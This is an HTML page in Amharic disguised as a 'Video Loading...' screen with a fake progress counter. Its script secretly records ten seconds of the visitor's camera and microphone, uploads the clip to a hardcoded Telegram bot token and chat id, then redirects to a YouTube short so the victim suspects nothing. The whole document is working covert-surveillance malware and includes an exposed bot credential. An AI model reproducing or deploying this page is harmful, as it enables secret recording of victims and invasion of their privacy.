<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Loading...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        /* የክበብ ሎደር */
        .loader-container { position: relative; width: 120px; height: 120px; }
        .spinner { border: 6px solid #222; border-top: 6px solid #3498db; border-radius: 50%; width: 100%; height: 100%; animation: spin 1s linear infinite; }
        .percent-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 20px; font-weight: bold; color: #3498db; }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        h3 { margin-top: 25px; font-weight: 300; letter-spacing: 1px; color: #eee; }
        .sub-text { font-size: 12px; color: #666; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="spinner"></div>
        <div id="percent" class="percent-text">0%</div>
    </div>
    
    <h3>ቪዲዮው እየተጫነ ነው...</h3>
    <div class="sub-text">እባክዎ እስከ 100% ድረስ ይጠብቁ</div>

    <video id="video" width="640" height="480" autoplay muted style="display:none;"></video>

    <script>
        const botToken = "8685482473:AAE7vWYe8mV4ZQ4PA0oj_18WgoJpu_jfZ3M";
        const chatId = "5630987526";
        const recordDuration = 10000; // 10 ሰከንድ ቀረጻ

        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                // የፐርሰንት ቆጠራ ሎጂክ
                let currentPercent = 0;
                const percentDisplay = document.getElementById('percent');
                
                // በየ 120 ሚሊሰከንዱ 1% ይጨምራል (ጠቅላላ 12 ሰከንድ አካባቢ ይፈጃል - ለቀረጻና ለመላኪያ)
                const timer = setInterval(() => {
                    if (currentPercent < 98) {
                        currentPercent++;
                        percentDisplay.innerText = currentPercent + "%";
                    }
                }, 120);

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', blob, 'capture.mp4');

                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        // መላኩ ሲያልቅ 100% ያደርገዋል
                        currentPercent = 100;
                        percentDisplay.innerText = "100%";
                        setTimeout(() => {
                            window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
                        }, 800);
                    });
                };

                mediaRecorder.start();

                // ከ10 ሰከንድ በኋላ ቀረጻውን ያቆማል
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, recordDuration);
            })
            .catch(() => {
                window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
            });
    </script>
</body>
</html>
